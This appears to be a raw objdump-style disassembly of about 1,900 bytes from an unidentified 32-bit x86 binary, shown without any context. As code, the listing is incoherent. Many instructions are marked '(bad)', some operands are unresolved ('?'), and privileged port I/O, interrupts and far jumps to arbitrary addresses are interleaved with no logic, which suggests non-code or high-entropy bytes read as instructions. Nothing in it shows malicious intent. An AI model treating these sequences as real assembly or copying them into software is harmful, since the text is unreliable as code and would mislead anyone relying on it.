  41d24a:	fst    QWORD PTR [eax-0x63327237]
  41d250:	repz push es
  41d252:	fisttp WORD PTR [ebx]
  41d254:	mov    dh,0x2b
  41d256:	loopne 0x41d21d
  41d258:	mov    dl,0xff
  41d25a:	out    0x70,eax
  41d25c:	mov    ecx,0xee37dc0d
  41d261:	loopne 0x41d2b9
  41d263:	sub    esi,DWORD PTR [edi+edi*2]
  41d266:	in     eax,0x5d
  41d268:	jns    0x41d239
  41d26a:	push   ds
  41d26b:	leave  
  41d26c:	inc    ecx
  41d26d:	div    DWORD PTR ds:0x9252553f
  41d273:	adc    BYTE PTR [ebx+0x52],al
  41d276:	std    
  41d277:	jbe    0x41d28e
  41d279:	dec    esi
  41d27a:	iret   
  41d27b:	push   ds
  41d27c:	jnp    0x41d29d
  41d27e:	add    BYTE PTR [ebx-0x2],ch
  41d281:	ret    0x9120
  41d284:	jge    0x41d2e4
  41d286:	add    al,0xd4
  41d288:	cli    
  41d289:	ret    0xf03b
  41d28c:	popa   
  41d28d:	and    DWORD PTR [edx+0x6a],0xffffffdf
  41d291:	mov    ch,0x10
  41d293:	cmp    DWORD PTR [ecx-0x13],eax
  41d296:	push   ecx
  41d297:	sbb    DWORD PTR ds:0xf02f5d4e,0x41
  41d29e:	jbe    0x41d281
  41d2a0:	cmp    dl,BYTE PTR [esi-0x555705f6]
  41d2a6:	repnz dec ebx
  41d2a8:	cmp    eax,0xe7a7daa
  41d2ad:	pusha  
  41d2ae:	scas   al,BYTE PTR es:[edi]
  41d2af:	fisttp QWORD PTR [edx+0x21]
  41d2b2:	pusha  
  41d2b3:	stos   DWORD PTR es:[edi],eax
  41d2b4:	xlat   BYTE PTR ds:[ebx]
  41d2b5:	stos   BYTE PTR es:[edi],al
  41d2b6:	das    
  41d2b7:	das    
  41d2b8:	dec    ebx
  41d2b9:	mov    bl,0xa
  41d2bb:	sub    ch,BYTE PTR [ebp-0x7e3ca2d3]
  41d2c1:	push   0x6f6236ea
  41d2c6:	scas   eax,DWORD PTR es:[edi]
  41d2c7:	les    ebp,FWORD PTR [edx]
  41d2c9:	xchg   esi,ebx
  41d2cb:	xor    DWORD PTR [ebp-0x75],esi
  41d2ce:	or     BYTE PTR [esi+ecx*2-0x621ec7d],al
  41d2d5:	mov    cl,0x69
  41d2d7:	dec    edi
  41d2d8:	dec    ebx
  41d2d9:	outs   dx,BYTE PTR ds:[esi]
  41d2da:	or     ebp,ebx
  41d2dc:	or     esi,DWORD PTR [edx-0x313d45ed]
  41d2e2:	add    eax,0x37f42a55
  41d2e7:	(bad)  
  41d2e8:	(bad)  
  41d2e9:	lods   eax,DWORD PTR ds:[esi]
  41d2ea:	mul    DWORD PTR [ecx-0x54]
  41d2ed:	pop    esp
  41d2ee:	mov    ?,WORD PTR [ecx+0x21]
  41d2f1:	mov    dh,0x24
  41d2f3:	nop
  41d2f4:	mov    bh,0xad
  41d2f6:	jmp    0x3e3321a9
  41d2fb:	xchg   ebx,eax
  41d2fc:	jle    0x41d28a
  41d2fe:	cs inc edi
  41d300:	lds    esp,FWORD PTR [eax+0x3e]
  41d303:	hlt    
  41d304:	mov    ebp,0xa6ca87a6
  41d309:	out    dx,al
  41d30a:	adc    edx,DWORD PTR [ebp+eax*4-0x4cf9bab8]
  41d311:	jno    0x41d2ad
  41d313:	mov    dl,0x51
  41d315:	lea    eax,[esi-0x19]
  41d318:	push   ds
  41d319:	mov    cl,0x4b
  41d31b:	or     BYTE PTR [ecx+0x581f398b],0x59
  41d322:	test   DWORD PTR [eax],0x16dfff75
  41d328:	ss or  eax,0xef6b7cf2
  41d32e:	sub    DWORD PTR [ecx-0x4094c61],0xffffffd8
  41d335:	mov    eax,ds:0x68669399
  41d33a:	mov    bl,0xf0
  41d33c:	jmp    0x68adf4db
  41d341:	pop    ebx
  41d342:	lods   eax,DWORD PTR ds:[esi]
  41d343:	mov    cl,0xcb
  41d345:	gs rcr cl,1
  41d348:	adc    ebp,DWORD PTR [edx+eax*8-0x6c]
  41d34c:	sbb    eax,0x49364667
  41d351:	sbb    ch,ch
  41d353:	push   ebx
  41d354:	xor    DWORD PTR [esi],esi
  41d356:	enter  0x2dc9,0xca
  41d35a:	fs stc 
  41d35c:	adc    eax,0xa708a6c7
  41d361:	inc    edx
  41d362:	popf   
  41d363:	test   al,0x1b
  41d365:	mov    bh,0xc0
  41d367:	mov    ch,0xda
  41d369:	pop    edi
  41d36a:	or     BYTE PTR [eax+0x61],al
  41d36d:	or     edi,DWORD PTR [edx+0xe5fa15c]
  41d373:	ror    DWORD PTR [eax-0x5a7e7635],0x18
  41d37a:	xchg   esp,eax
  41d37b:	push   ebp
  41d37c:	mov    al,BYTE PTR [edx-0x2f]
  41d37f:	mov    BYTE PTR [ebp-0x62d90652],cl
  41d385:	sub    al,0x84
  41d387:	scas   eax,DWORD PTR es:[edi]
  41d388:	pop    es
  41d389:	loope  0x41d400
  41d38b:	xchg   esi,eax
  41d38c:	lea    edx,[esi-0x653afab8]
  41d392:	ins    BYTE PTR es:[edi],dx
  41d393:	fsubr  st(0),st
  41d395:	jne    0x41d3ef
  41d397:	pop    ebp
  41d398:	cld    
  41d399:	mov    ebx,0x3ddbef7b
  41d39e:	mov    ds:0xccf406d7,eax
  41d3a3:	call   0x6ff5:0x8101c7a3
  41d3aa:	sbb    DWORD PTR [eax],edi
  41d3ac:	push   ds
  41d3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3ae:	jmp    0x306f:0x2052419b
  41d3b5:	adc    esp,DWORD PTR [edx-0x5ce32a61]
  41d3bb:	fsub   st,st(6)
  41d3bd:	cmp    DWORD PTR [edi+0x75ef1cab],esp
  41d3c3:	daa    
  41d3c4:	outs   dx,DWORD PTR ds:[esi]
  41d3c5:	add    ecx,eax
  41d3c7:	out    dx,eax
  41d3c8:	pop    ecx
  41d3c9:	mov    bl,0x23
  41d3cb:	fst    QWORD PTR [edi+0x32]
  41d3ce:	xchg   esi,eax
  41d3cf:	sbb    al,0x38
  41d3d1:	inc    esp
  41d3d2:	test   dl,dl
  41d3d4:	jae    0x41d3e3
  41d3d6:	cld    
  41d3d7:	ins    BYTE PTR es:[edi],dx
  41d3d8:	je     0x41d423
  41d3da:	inc    eax
  41d3db:	popa   
  41d3dc:	sbb    al,bh
  41d3de:	xor    BYTE PTR [esi-0x330ad788],dl
  41d3e4:	mov    esi,0x88b5182f
  41d3e9:	cld    
  41d3ea:	les    esp,FWORD PTR [ebx+0x34]
  41d3ed:	xor    eax,0x11677781
  41d3f2:	mov    dh,0xb1
  41d3f4:	int    0xb6
  41d3f6:	pop    ds
  41d3f7:	push   esp
  41d3f8:	retf   0x89e
  41d3fb:	jmp    0x7a9:0xc68c5a39
  41d402:	and    esp,ecx
  41d404:	mov    dh,0xb4
  41d406:	inc    esi
  41d407:	(bad)  
  41d408:	mov    WORD PTR [ecx],ss
  41d40a:	or     ebx,DWORD PTR ds:0xf0285ada
  41d410:	iret   
  41d411:	jns    0x41d427
  41d413:	push   es
  41d414:	mov    ds:0x2f8d99a2,eax
  41d419:	pop    esi
  41d41a:	rol    BYTE PTR [ebx-0x25],0xa4
  41d41e:	xor    bl,ah
  41d420:	test   eax,0x712b7262
  41d425:	xchg   edi,eax
  41d426:	xor    BYTE PTR [esi-0x60c769b4],ah
  41d42c:	xchg   DWORD PTR [ecx+eiz*1],esp
  41d42f:	push   esi
  41d430:	xchg   esp,eax
  41d431:	pop    esp
  41d432:	je     0x41d460
  41d434:	adc    bh,0x30
  41d437:	nop
  41d438:	add    BYTE PTR [ecx+0x752a0164],0xa3
  41d43f:	lods   eax,DWORD PTR ds:[esi]
  41d440:	push   eax
  41d441:	cmp    eax,0xff0f6a45
  41d446:	mov    eax,0xcd590cf5
  41d44b:	fld    TBYTE PTR [edi+ecx*8]
  41d44e:	out    0xb8,al
  41d450:	jge    0x41d419
  41d452:	addr16 mov al,0x5f
  41d455:	dec    esp
  41d456:	clc    
  41d457:	mov    DWORD PTR [ebx+0x23],eax
  41d45a:	sub    ch,BYTE PTR [edx-0x7e]
  41d45d:	fs pop ds
  41d45f:	jle    0x41d477
  41d461:	data16 adc BYTE PTR [edx+ebp*2-0x58],bh
  41d466:	cmp    DWORD PTR [ecx],eax
  41d468:	sbb    ch,BYTE PTR [eax]
  41d46a:	shl    BYTE PTR [eax+esi*4+0xa],1
  41d46e:	mov    bh,0x12
  41d470:	mov    BYTE PTR [ecx],cl
  41d472:	cmp    DWORD PTR [ebp+0x1fc944f6],ebp
  41d478:	repz xchg ebp,eax
  41d47a:	fstp   TBYTE PTR [ecx-0x1c]
  41d47d:	inc    BYTE PTR ds:0xea55783a
  41d483:	es mov ecx,0x4c594e8
  41d489:	cs push ebp
  41d48b:	xchg   ecx,eax
  41d48c:	and    ch,dh
  41d48e:	rcr    DWORD PTR [ecx],0x1c
  41d491:	sbb    dl,BYTE PTR [ecx]
  41d493:	arpl   WORD PTR [ebx+0x51a904f9],dx
  41d499:	cmp    al,0x47
  41d49b:	daa    
  41d49c:	add    ch,0x11
  41d49f:	sbb    DWORD PTR [esi+eiz*1-0x32782ff1],edx
  41d4a6:	pop    ebx
  41d4a7:	std    
  41d4a8:	add    al,0xb7
  41d4aa:	cli    
  41d4ab:	cmp    BYTE PTR [ebp+0x1093fbc5],al
  41d4b1:	pop    esp
  41d4b2:	adc    dl,bl
  41d4b4:	cli    
  41d4b5:	(bad)  
  41d4b6:	hlt    
  41d4b7:	add    BYTE PTR [ebx-0x3d],al
  41d4ba:	push   esp
  41d4bb:	test   DWORD PTR [ecx+0x7b],ebx
  41d4be:	dec    ecx
  41d4bf:	lea    ecx,[ebx+0x1441fa3a]
  41d4c5:	mov    BYTE PTR [esi+esi*2],ch
  41d4c8:	mov    edi,0x57d45922
  41d4cd:	in     al,0x7d
  41d4cf:	imul   ebx,DWORD PTR [ebp+0xd],0xffffffc4
  41d4d3:	xchg   ebx,eax
  41d4d4:	sub    al,0x7
  41d4d6:	mov    eax,DWORD PTR [ecx]
  41d4d8:	mov    dh,0x25
  41d4da:	stos   DWORD PTR es:[edi],eax
  41d4db:	jb     0x41d4b8
  41d4dd:	jbe    0x41d496
  41d4df:	addr16 and al,0xb8
  41d4e2:	mov    dh,0xbe
  41d4e4:	sahf   
  41d4e5:	mov    esp,0x5f92501c
  41d4ea:	adc    dl,BYTE PTR [esp+ecx*4]
  41d4ed:	mov    bh,0xcd
  41d4ef:	adc    eax,0x15b4b051
  41d4f4:	neg    BYTE PTR [edx-0x16151afb]
  41d4fa:	(bad)  
  41d4fb:	jecxz  0x41d4c6
  41d4fd:	data16 add al,BYTE PTR [edx]
  41d500:	loop   0x41d50a
  41d502:	icebp  
  41d503:	sbb    BYTE PTR [ecx],ah
  41d505:	shl    eax,0x6e
  41d508:	xor    ebp,DWORD PTR [edx-0x6a61a3e3]
  41d50e:	lahf   
  41d50f:	repz popa 
  41d511:	call   0x8da88b49
  41d516:	xchg   dl,ah
  41d518:	loopne 0x41d56f
  41d51a:	xchg   esi,eax
  41d51b:	or     ah,BYTE PTR [ebx+ecx*8-0x50a37902]
  41d522:	aad    0xd0
  41d524:	and    DWORD PTR [ebx-0x33f95b64],ebp
  41d52a:	cli    
  41d52b:	aaa    
  41d52c:	out    dx,eax
  41d52d:	frstor [edx+eiz*1-0x60]
  41d531:	retf   0x5d2f
  41d534:	das    
  41d535:	fwait
  41d536:	js     0x41d56f
  41d538:	dec    esp
  41d539:	jp     0x41d5a0
  41d53b:	mov    esp,0xa5529d7d
  41d540:	shl    ah,cl
  41d542:	mov    al,0x59
  41d544:	lds    eax,FWORD PTR [edi+0x13]
  41d547:	jl     0x41d58f
  41d549:	adc    DWORD PTR [esi-0x63],esi
  41d54c:	mov    ebp,0x9e03f56b
  41d551:	xor    eax,0x32476a3
  41d556:	jp     0x41d5a8
  41d558:	mov    ch,0xfd
  41d55a:	adc    al,BYTE PTR [ebx-0x75]
  41d55d:	jmp    0xad36ac83
  41d562:	add    eax,0x40714ec8
  41d567:	cwde   
  41d568:	aad    0xe2
  41d56a:	scas   al,BYTE PTR es:[di]
  41d56c:	sbb    DWORD PTR [ecx],0x2c
  41d56f:	stos   BYTE PTR es:[edi],al
  41d570:	imul   edi,DWORD PTR [ecx],0xc2eb6acf
  41d576:	div    DWORD PTR [ecx+0x656ebc2c]
  41d57c:	fptan  
  41d57e:	xor    al,0xa7
  41d580:	ret    0x2cfb
  41d583:	dec    esi
  41d584:	jnp    0x41d585
  41d586:	jecxz  0x41d5e5
  41d588:	push   ecx
  41d589:	xchg   edi,eax
  41d58a:	mov    eax,0x2ac72901
  41d58f:	xor    BYTE PTR [ecx+0x1a],0xcf
  41d593:	mov    al,0xb
  41d595:	aad    0x62
  41d597:	gs in  al,dx
  41d599:	inc    ebx
  41d59a:	sub    DWORD PTR [ecx-0x20],eax
  41d59d:	nop
  41d59e:	inc    esi
  41d59f:	pop    ecx
  41d5a0:	cmp    eax,0xb8883b63
  41d5a5:	cmp    eax,DWORD PTR [ebp+0x128a40b]
  41d5ab:	aaa    
  41d5ac:	cmp    DWORD PTR [eax],edx
  41d5ae:	or     BYTE PTR [ecx],dh
  41d5b0:	pop    edx
  41d5b1:	call   0x2fe17065
  41d5b6:	ror    DWORD PTR [eax-0x92ac4f6],cl
  41d5bc:	ja     0x41d5ab
  41d5be:	xchg   ebp,eax
  41d5bf:	ret    0xb32e
  41d5c2:	dec    ebx
  41d5c3:	(bad)  
  41d5c4:	fidivr DWORD PTR [ebx+0x200573ca]
  41d5ca:	jo     0x41d5ae
  41d5cc:	nop
  41d5cd:	ret    
  41d5ce:	lods   al,BYTE PTR ds:[esi]
  41d5cf:	jnp    0x41d600
  41d5d1:	mov    cl,0x9d
  41d5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5d4:	out    dx,al
  41d5d5:	shl    DWORD PTR [ebx],1
  41d5d7:	add    BYTE PTR [edx],ch
  41d5d9:	(bad)  
  41d5da:	lds    esp,FWORD PTR [edx-0x64]
  41d5dd:	scas   eax,DWORD PTR es:[edi]
  41d5de:	imul   edx,DWORD PTR [edx+edx*8+0x53],0x2b
  41d5e3:	sbb    DWORD PTR [edi+0x3c],0x51
  41d5e7:	pop    ds
  41d5e8:	(bad)  
  41d5e9:	sbb    ecx,ebp
  41d5eb:	mov    ebp,0xfee9e95d
  41d5f0:	jge    0x41d613
  41d5f2:	cdq    
  41d5f3:	adc    al,0xbf
  41d5f5:	mov    ?,WORD PTR [edi-0x39]
  41d5f8:	dec    esi
  41d5f9:	cmp    BYTE PTR [ebx+0x23],dh
  41d5fc:	sub    al,0x69
  41d5fe:	pop    es
  41d5ff:	adc    al,0x40
  41d601:	rcl    cl,cl
  41d603:	fnstenv [edi]
  41d605:	dec    esp
  41d606:	(bad)  
  41d607:	ins    DWORD PTR es:[edi],dx
  41d608:	sub    ah,BYTE PTR ds:[edx-0x2f]
  41d60c:	xor    al,0x9e
  41d60e:	pushf  
  41d60f:	daa    
  41d610:	dec    edi
  41d611:	sub    eax,0x8a0fa9d7
  41d616:	cmp    eax,0xeec4b123
  41d61b:	or     ecx,ebp
  41d61d:	pushf  
  41d61e:	inc    ecx
  41d61f:	push   es
  41d620:	mov    edx,0x82a581bc
  41d625:	data16 (bad) 
  41d627:	cld    
  41d628:	cmp    bl,0x7b
  41d62b:	add    DWORD PTR [esi+0x21509258],ebx
  41d631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d632:	mov    edx,?
  41d634:	mov    eax,0x784fc025
  41d639:	(bad)  
  41d63a:	lahf   
  41d63b:	lods   eax,DWORD PTR ds:[esi]
  41d63c:	sub    DWORD PTR [ebp-0x1acea196],ecx
  41d642:	push   ebx
  41d643:	xor    BYTE PTR [ebx],0x6
  41d646:	ret    0x994d
  41d649:	(bad)  
  41d64a:	pop    eax
  41d64b:	cmc    
  41d64c:	pop    edi
  41d64d:	and    eax,0x3b81a017
  41d652:	sbb    BYTE PTR [eax],bl
  41d654:	call   0x80b8:0xba9f5c12
  41d65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65c:	jl     0x41d659
  41d65e:	pop    ebx
  41d65f:	leave  
  41d660:	sbb    ebp,DWORD PTR [ebp-0x36bc4c91]
  41d666:	rcl    BYTE PTR [eax+0x4086fbce],0x57
  41d66d:	dec    ebx
  41d66e:	jmp    0x41d6af
  41d670:	mov    esi,0x6ae9a58b
  41d675:	hlt    
  41d676:	jno    0x41d6a2
  41d678:	xchg   ebp,eax
  41d679:	pop    ebx
  41d67a:	loopne 0x41d692
  41d67c:	retf   
  41d67d:	xchg   ebx,eax
  41d67e:	and    eax,0x98d1386d
  41d684:	pusha  
  41d685:	int    0xc5
  41d687:	das    
  41d688:	xor    BYTE PTR [ebp+0x4d],ah
  41d68b:	mov    ebx,0x1de7b205
  41d690:	push   eax
  41d691:	sbb    al,0x22
  41d693:	jecxz  0x41d68d
  41d695:	sbb    BYTE PTR [esi+0x7557d502],0x81
  41d69c:	mov    edx,0x209d7ea1
  41d6a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6a2:	add    ch,BYTE PTR [esi-0x81c0a82]
  41d6a8:	sub    al,0x92
  41d6aa:	jo     0x41d631
  41d6ac:	mov    BYTE PTR [eax],ch
  41d6ae:	fsub   st(5),st
  41d6b0:	add    DWORD PTR [ebx+0x2b998526],edi
  41d6b6:	or     BYTE PTR [eax-0x3],dh
  41d6b9:	(bad)  [esi-0x23]
  41d6bc:	aam    0xaa
  41d6be:	retf   0x319b
  41d6c1:	or     eax,0x428a55a9
  41d6c6:	and    eax,0x473b3725
  41d6cb:	jno    0x41d729
  41d6cd:	and    esp,edx
  41d6cf:	adc    DWORD PTR [edi-0x22cbe131],ebp
  41d6d5:	fs mov edx,0xd0821fa5
  41d6db:	pop    esp
  41d6dc:	outs   dx,DWORD PTR ds:[esi]
  41d6dd:	add    BYTE PTR [ecx+0x3],bh
  41d6e0:	pop    ecx
  41d6e1:	add    ah,BYTE PTR [esi-0x35e13667]
  41d6e7:	rol    DWORD PTR [edi],0x43
  41d6ea:	cmp    dl,cl
  41d6ec:	adc    BYTE PTR [si],0xc1
  41d6f0:	aas    
  41d6f1:	inc    esp
  41d6f2:	stc    
  41d6f3:	outs   dx,BYTE PTR ds:[esi]
  41d6f4:	mov    ch,dh
  41d6f6:	out    dx,al
  41d6f7:	jl     0x41d6f2
  41d6f9:	dec    ebp
  41d6fa:	inc    ecx
  41d6fb:	mov    al,0xca
  41d6fd:	pop    ecx
  41d6fe:	das    
  41d6ff:	mov    edi,0xc1bef365
  41d704:	inc    ebp
  41d705:	and    DWORD PTR ds:0xc4fd5b09,ebp
  41d70b:	loope  0x41d6c3
  41d70d:	mov    ds:0xc1d3ba75,eax
  41d712:	(bad)  
  41d714:	ja     0x41d6e5
  41d716:	pop    esp
  41d717:	push   esp
  41d718:	aas    
  41d719:	out    0xd0,eax
  41d71b:	sbb    esp,DWORD PTR [edi]
  41d71d:	push   ecx
  41d71e:	out    0xfb,al
  41d720:	sbb    BYTE PTR [edx+0x52],0x43
  41d724:	mov    ebx,DWORD PTR [edx-0x4c9e9fe4]
  41d72a:	or     al,0x4d
  41d72c:	jbe    0x41d75a
  41d72e:	add    eax,0xc91a88ff
  41d733:	mov    edi,cs
  41d735:	jne    0x41d6b7
  41d737:	xlat   BYTE PTR ds:[ebx]
  41d738:	aad    0x62
  41d73a:	xlat   BYTE PTR ds:[ebx]
  41d73b:	iret   
  41d73c:	xor    al,0x9a
  41d73e:	repz push esi
  41d740:	mov    edx,0x237bd4fe
  41d745:	or     eax,0x944a4372
  41d74a:	pop    ss
  41d74b:	addr16 retf 0x3864
  41d74f:	and    DWORD PTR [ebx],0x476f21c3
  41d755:	cld    
  41d756:	mov    ch,0x29
  41d758:	je     0x41d7cb
  41d75a:	and    bh,dl
  41d75c:	mov    ds,WORD PTR [esi]
  41d75e:	pop    edi
  41d75f:	push   ss
  41d760:	jno    0x41d76a
  41d762:	or     esp,DWORD PTR [eax]
  41d764:	aaa    
  41d765:	inc    ebx
  41d766:	addr16 pop edx
  41d768:	jmp    0x527b876
  41d76d:	adc    BYTE PTR [ebx+eiz*8],bl
  41d770:	push   ds
  41d771:	xor    al,0x78
  41d773:	ss sub ah,cl
  41d776:	jl     0x41d7e0
  41d778:	enter  0xe0e2,0x81
  41d77c:	int3   
  41d77d:	sub    ebx,DWORD PTR [edi]
  41d77f:	aas    
  41d780:	and    DWORD PTR [edx-0x323e3d78],eax
  41d786:	push   edi
  41d787:	test   al,0xaa
  41d789:	xchg   esp,eax
  41d78a:	inc    eax
  41d78b:	mov    al,al
  41d78d:	mov    eax,ds:0x2ebac881
  41d792:	inc    esi
  41d793:	(bad)  
  41d794:	mov    al,ds:0x5cbe9e48
  41d799:	sbb    ch,BYTE PTR [ebp+0x38]
  41d79c:	jae    0x41d7ca
  41d79e:	shl    esp,0xb0
  41d7a1:	adc    DWORD PTR [ecx+0x51],esp
  41d7a4:	iret   
  41d7a5:	sub    DWORD PTR [ebx+0xb],esi
  41d7a8:	(bad)  
  41d7a9:	sahf   
  41d7aa:	sbb    bl,bl
  41d7ac:	pop    ecx
  41d7ad:	pop    ss
  41d7ae:	jns    0x41d82d
  41d7b0:	stos   DWORD PTR es:[edi],eax
  41d7b1:	mov    ecx,0x5d347d24
  41d7b6:	cmp    BYTE PTR [ecx+0x77],cl
  41d7b9:	cs inc ebx
  41d7bb:	sub    eax,0xc78aa4d1
  41d7c0:	and    eax,0xc4f59440
  41d7c5:	es dec eax
  41d7c7:	rcl    BYTE PTR [eax+0x3420bb57],0xea
  41d7ce:	in     al,0xa2
  41d7d0:	sub    eax,0x662a12dc
  41d7d5:	hlt    
  41d7d6:	arpl   WORD PTR [ecx+eax*1],sp
  41d7d9:	fprem  
  41d7db:	sbb    bl,BYTE PTR [esi-0x71]
  41d7de:	xchg   BYTE PTR [esi+edi*4],ch
  41d7e1:	mov    ch,0x1e
  41d7e3:	or     BYTE PTR [ecx-0x2d63b348],dl
  41d7e9:	mov    ecx,0x6106ea39
  41d7ee:	je     0x41d83f
  41d7f0:	popa   
  41d7f1:	js     0x41d782
  41d7f3:	or     al,0xe3
  41d7f5:	inc    ebp
  41d7f6:	inc    ebp
  41d7f7:	cdq    
  41d7f8:	pusha  
  41d7f9:	fistp  DWORD PTR [ecx-0x66]
  41d7fc:	mov    ds:0x688da6a9,eax
  41d801:	xchg   edx,eax
  41d802:	jns    0x41d7de
  41d804:	jns    0x41d7e4
  41d806:	push   eax
  41d807:	pop    es
  41d808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d809:	aaa    
  41d80a:	xchg   edi,eax
  41d80b:	push   edx
  41d80c:	fadd   QWORD PTR [ecx-0x60]
  41d80f:	out    0x84,eax
  41d811:	push   ebp
  41d812:	push   ebx
  41d813:	mov    ds:0x18201d77,eax
  41d818:	pop    ebx
  41d819:	and    esi,DWORD PTR [edx+0x5c1a1699]
  41d81f:	pop    ss
  41d820:	push   ebx
  41d821:	call   0x372b4851
  41d826:	dec    edx
  41d827:	push   ecx
  41d828:	ds stos BYTE PTR es:[edi],al
  41d82a:	sti    
  41d82b:	sbb    bl,BYTE PTR [eax+0x4f]
  41d82e:	ret    0x1e26
  41d831:	out    dx,al
  41d832:	popa   
  41d833:	sub    ebp,DWORD PTR [edi+0x16d8ca43]
  41d839:	fucom  st(6)
  41d83b:	adc    al,BYTE PTR cs:[edi+0x1b]
  41d83f:	adc    bh,BYTE PTR [ecx+0x7f425f2a]
  41d845:	mov    ebp,0x1453bb0b
  41d84a:	sbb    BYTE PTR [edx+ebx*1-0x6616c3c0],ch
  41d851:	addr16 jo 0x41d8c7
  41d854:	push   cs
  41d855:	pop    es
  41d856:	int3   
  41d857:	pop    edi
  41d858:	outs   dx,DWORD PTR ds:[esi]
  41d859:	mov    bl,0xf3
  41d85b:	aad    0xb
  41d85d:	mov    edx,0x91e0f8fb
  41d862:	stos   BYTE PTR es:[edi],al
  41d863:	lods   al,BYTE PTR ds:[esi]
  41d864:	or     eax,0xba9a3813
  41d869:	inc    ebp
  41d86a:	ret    
  41d86b:	xchg   edi,eax
  41d86c:	mov    gs,WORD PTR [edi+0x75fed359]
  41d872:	or     dl,BYTE PTR [ecx+0x1e]
  41d875:	mov    bh,0x32
  41d877:	dec    esi
  41d878:	mov    edi,0xa44a2de3
  41d87d:	fwait
  41d87e:	or     bl,BYTE PTR [esi-0x1b]
  41d881:	ins    DWORD PTR es:[edi],dx
  41d882:	mov    esi,DWORD PTR [edx+0x3e]
  41d885:	mov    edx,ecx
  41d887:	mov    al,0x5a
  41d889:	jl     0x41d8ff
  41d88b:	ins    DWORD PTR es:[edi],dx
  41d88c:	test   al,0xf1
  41d88e:	loope  0x41d8d6
  41d890:	xor    DWORD PTR [ebp-0x6d],esp
  41d893:	sub    eax,DWORD PTR [esi-0x58]
  41d896:	in     al,0x76
  41d898:	das    
  41d899:	xchg   edi,eax
  41d89a:	std    
  41d89b:	cmp    ch,ch
  41d89d:	js     0x41d8a3
  41d89f:	or     DWORD PTR [ebp-0x2f],0x68013cdf
  41d8a6:	mov    cl,0xa
  41d8a8:	(bad)  
  41d8a9:	(bad)  
  41d8aa:	jecxz  0x41d908
  41d8ac:	cmc    
  41d8ad:	fmulp  st(6),st
  41d8af:	mov    cl,0x0
  41d8b1:	and    edx,edi
  41d8b3:	mov    dl,BYTE PTR [edx-0x46b7575c]
  41d8b9:	scas   al,BYTE PTR es:[edi]
  41d8ba:	mov    esp,0xfeb283b8
  41d8bf:	dec    edi
  41d8c0:	sub    BYTE PTR [edi+0x69302eda],dl
  41d8c6:	ret    
  41d8c7:	jno    0x41d8f9
  41d8c9:	mov    cl,0xdc
  41d8cb:	repnz sub al,0x42
  41d8ce:	dec    edx
  41d8cf:	push   edx
  41d8d0:	(bad)  
  41d8d1:	fdivr  QWORD PTR [edi+0x70]
  41d8d4:	int    0x8e
  41d8d6:	in     eax,0x3c
  41d8d8:	xor    eax,0x320c7b3
  41d8dd:	ins    BYTE PTR es:[edi],dx
  41d8de:	lods   eax,DWORD PTR ds:[esi]
  41d8df:	stc    
  41d8e0:	jle    0x41d870
  41d8e2:	imul   esi,DWORD PTR [ecx-0x12],0x37
  41d8e6:	popa   
  41d8e7:	fbstp  TBYTE PTR [ecx+edx*2-0x10]
  41d8eb:	addr16 mov eax,ds:0xa1
  41d8ef:	mov    al,0x1c
  41d8f1:	xor    eax,0x1d6e9f81
  41d8f6:	dec    esp
  41d8f7:	cmc    
  41d8f8:	xor    al,0x3
  41d8fa:	dec    ebx
  41d8fb:	inc    eax
  41d8fc:	popf   
  41d8fd:	mov    cs,WORD PTR [eax+edx*2-0x71d47116]
  41d904:	lea    eax,[edi]
  41d906:	pop    ecx
  41d907:	add    DWORD PTR [ebx-0x553f343b],ebx
  41d90d:	and    esi,DWORD PTR [ecx]
  41d90f:	mov    bl,0x2d
  41d911:	xlat   BYTE PTR ds:[ebx]
  41d912:	in     al,dx
  41d913:	test   BYTE PTR [ebx+ebp*8],cl
  41d916:	aas    
  41d917:	dec    edi
  41d918:	imul   BYTE PTR [ebp+eax*8+0x57a5fa07]
  41d91f:	mov    DWORD PTR [edx],ebp
  41d921:	pushf  
  41d922:	shl    DWORD PTR [ecx],cl
  41d924:	(bad)  
  41d925:	adc    dh,al
  41d927:	arpl   WORD PTR [esi+0x260755f0],di
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	aad    0x2b
  41d930:	add    al,0x1e
  41d932:	add    BYTE PTR [edi+esi*8+0x31ee1d87],0x88
  41d93a:	stos   BYTE PTR es:[edi],al
  41d93b:	jb     0x41d980
  41d93d:	push   ss
  41d93e:	adc    bh,al
  41d940:	sub    al,0x95
  41d942:	rcl    BYTE PTR [ebp+0x4f],1
  41d945:	pop    ds
  41d946:	push   ss
  41d947:	xchg   BYTE PTR [edi-0x6a971864],bl
  41d94d:	sbb    BYTE PTR [esi-0x26540548],cl
  41d953:	es cs cdq 
  41d956:	xchg   ebp,eax
  41d957:	jns    0x41d98f
  41d959:	dec    edi
  41d95a:	pop    eax
  41d95b:	cdq    
  41d95c:	addr16 inc eax
  41d95e:	out    dx,al
  41d95f:	add    DWORD PTR [ebx-0x6],0xffffffd0
  41d963:	push   esi
  41d964:	cmp    eax,0x9e53bf30
  41d969:	in     al,dx
  41d96a:	xchg   esi,eax
  41d96b:	rcr    DWORD PTR [ebx-0xb3e4672],cl
  41d971:	pop    eax
  41d972:	(bad)  
  41d973:	mov    cs,WORD PTR [eax]
  41d975:	mov    eax,0x9d3431fb
  41d97a:	in     eax,0xcd
  41d97c:	out    dx,al
  41d97d:	lods   eax,DWORD PTR ds:[esi]
  41d97e:	or     eax,0x8c0b4282
  41d983:	xchg   ebx,eax
  41d984:	in     ax,0xd5
  41d987:	ja     0x41d938
  41d989:	jmp    0x2235:0x53d65f72
  41d990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d991:	fsubr  st(3),st
  41d993:	or     DWORD PTR [edi+0x2d],ebp
  41d996:	push   esp
  41d997:	lock mov edx,0xc82cc5b7
  41d99d:	or     DWORD PTR ds:0x55b62a58,ebx
  41d9a3:	pop    ss
  41d9a4:	sub    BYTE PTR [ebp-0xb24f349],ch
  41d9aa:	push   edx
  41d9ab:	dec    esi
  41d9ac:	(bad)  
  41d9ad:	dec    edi
  41d9ae:	mov    bh,BYTE PTR [edx]
  41d9b0:	out    0x95,eax
  41d9b2:	mov    dh,0x75
  41d9b4:	xchg   ecx,eax
  41d9b5:	out    dx,al
  41d9b6:	dec    eax
  41d9b7:	mov    ecx,0x20c52897
